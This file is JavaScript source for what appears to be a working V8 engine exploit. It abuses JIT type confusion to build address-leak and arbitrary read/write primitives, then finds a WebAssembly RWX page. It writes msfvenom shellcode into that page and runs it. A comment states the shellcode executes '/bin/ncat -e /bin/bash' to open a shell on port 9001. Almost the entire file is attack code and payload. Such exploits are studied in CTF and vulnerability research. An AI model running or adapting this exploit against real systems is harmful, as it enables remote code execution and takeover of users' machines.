var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function gc() {
  for (let i = 0; i < 100; i++) {
    new ArrayBuffer(0x100000);
  }
}

function hex(val) {
  return '0x' + val.toString(16);
}

/**
  * Float to Integer
  * in: Float (ex: 2.2)
  * out: Unsigned Int 
*/
function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0] + u64_buf[1] * 0x100000000;
}

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2) 
*/
function itof(val) {
  u64_buf[0] = val % 0x100000000;
  u64_buf[1] = val / 0x100000000;
  return f64_buf[0];
}

function ftoh(val) {
  return "0x" + ftoi(val).toString(16)
}

// Exploit start here

function corrupt_prop(obj_to_write, val) {
  function confuse_write(o, f) {
    var tmp = o.a;
    f();
    o.b = val;
    return o.b;
  }
  var o = { a: 1.1 };
  o.b = 1.2;
  for (let i = 0; i < 100000; i++) {
    confuse_write(o, () => 1);
    confuse_write(o, () => 2);
    confuse_write(o, () => 3);
  }
  var o = { a: 1.1 };
  o.b = 1.2;
  var res = confuse_write(o, () => { o.b = obj_to_write })
}

// this addrOf works just one time
// Apparently, after use this function, the Map are
// permanently changed to a different format on change type of properties
function one_time_addrOf(obj) {
  let o = { a: 1.1, b: 1.2 };
  function confuse_read(o, f) {
    var tmp = o.a;
    f();
    return o.b;
  }
  for (let i = 0; i < 100000; i++) {
    confuse_read(o, () => 1);
    confuse_read(o, () => 2);
    confuse_read(o, () => 3);
  }
  return ftoi(confuse_read(o, () => { o.b = obj }));
}

function read64(addr) {
  // write in memViewBuf.backing_store we address and read
  driver.setFloat64(31, itof(addr), true);
  var memView = new DataView(memViewBuf);
  return ftoi(memView.getFloat64(0, true));
}

function write_buf(addr, payload) {
  driver.setFloat64(31, itof(addr), true);
  var memView = new DataView(memViewBuf);
  for (let i = 0; i < payload.length; i++) {
    memView.setUint32(4 * i, payload[i], true);
  }
}

function addrOf(obj) {
  driverBuf.leakme = obj;
  let props = read64(bufAddr + 0x7);
  return read64(props + 0xf) - 1;
}

var memViewBuf = new ArrayBuffer(1024);
var driverBuf = new ArrayBuffer(1024);

// Force GC to move driverBuf to old space, if not, we memory leak not will work correctly
gc();

var bufAddr = one_time_addrOf(driverBuf);
var victim = { inline: 1337 };
// Force out-of-line storage
victim._offset0 = {}; victim._offset8 = {};
victim.offset16 = {};

// now "victim.offset16" is a pointer to driverBuf
corrupt_prop(victim, itof(bufAddr));
// Overwrite driverBuf backing_store pointer with memViewBuf
victim.offset16 = memViewBuf;
var driver = new DataView(driverBuf);

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_exec_shellcode = wasm_instance.exports.main;

driverBuf.leakme = wasm_exec_shellcode;
var mapAddr = read64(bufAddr - 1);
var instanceDescriptorsAddr = read64(mapAddr + 0x2f);
var wasm_addr = read64(instanceDescriptorsAddr + 0x2f);

console.log("[+] Found pointer to wasm function: 0x" + wasm_addr.toString(16))
var rwx_page_addr = read64(wasm_addr + 0x37) + 0x5f;
console.log("[+] Found pointer to rwx page: 0x" + rwx_page_addr.toString(16))

// msfvenom -p linux/x64/exec CMD='/bin/ncat -e /bin/bash 0.0.0.0 9001' --format dword
var shellcode = [0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x24e8525e, 0x2f000000, 0x2f6e6962,
  0x7461636e, 0x20652d20, 0x6e69622f, 0x7361622f, 0x2e302068, 0x2e302e30, 0x30392030, 0x56003130,
  0x6a5e5457, 0x050f583b
];

write_buf(rwx_page_addr, shellcode);

console.log("[+] WASM instance - OK");
console.log("[+] Shellcode - OK");
console.log("[+] Read/write/exec - OK");

console.log("[*] Running shellcode...");
wasm_exec_shellcode();
